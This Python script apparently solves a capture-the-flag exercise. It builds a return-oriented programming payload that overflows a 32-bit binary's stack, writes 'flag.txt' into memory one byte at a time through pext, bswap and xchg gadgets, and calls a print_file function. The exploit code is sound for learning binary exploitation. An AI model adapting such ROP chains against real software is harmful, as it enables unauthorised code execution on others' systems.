#!/usr/bin/env python

import struct
import sys

padding_len = 40 #until just before ebp is overwritten

coff = struct.pack("I", 0xc000ffee) #just something recognizable so I'm sure the offset is right

print_file = struct.pack("I", 0x080483d0) # print_file(char*)

pop_ebp = struct.pack("I", 0x080485bb) # pop ebp; ret
pop_ecx_bswap = struct.pack("I", 0x08048558) # pop ecx; bswap ecx; ret

# 0x8048543 mov   eax,ebp
# 0x8048545 mov   ebx,0xb0bababa
# 0x804854a pext  edx,ebx,eax
# 0x804854f mov   eax,0xdeadbeef
pext = struct.pack("I", 0x08048543)

xchg = struct.pack("I", 0x08048555) # xchg BYTE PTR [ecx], dl; ret

filename_loc_raw = 0x0804a018 #.data
filename_loc = struct.pack("I", filename_loc_raw)
filename = b"flag.txt"

pext_source = 0xb0bababa
def gen_pext_mask(intended_output):
    source_tmp = pext_source
    mask = 0
    depth = 0

    for b in bin(intended_output)[:1:-1]:
        while str(source_tmp % 2) != b:
            source_tmp = int(source_tmp/2)
            depth+=1

        mask = mask | 2**depth
        depth+=1
        source_tmp = int(source_tmp/2)
    
    sys.stderr.buffer.write(b"pext mask (" + bytes(hex(intended_output), "ascii") + b"): " + bytes(bin(mask), "ascii") + b'\n')
    
    return mask

def set_ecx(val:int) -> bytes:
    return pop_ecx_bswap + struct.pack("I", val)[::-1]

def set_edx(val:int) -> bytes:
    return pop_ebp + struct.pack("I", gen_pext_mask(val)) + pext

def write_byte(dest:int, val:int) -> bytes:
    return set_ecx(dest) + set_edx(val) + xchg

def write_bytes(dest:int, bstring: bytes):
    res = b""
    
    for (i,x) in enumerate(list(bstring)):
       res += write_byte(dest+i, x) 
    
    return res

payload = b'A'*padding_len
payload += coff 

payload += write_bytes(filename_loc_raw, filename)
payload += print_file
payload += pop_ebp
payload += filename_loc

sys.stdout.buffer.write(payload)
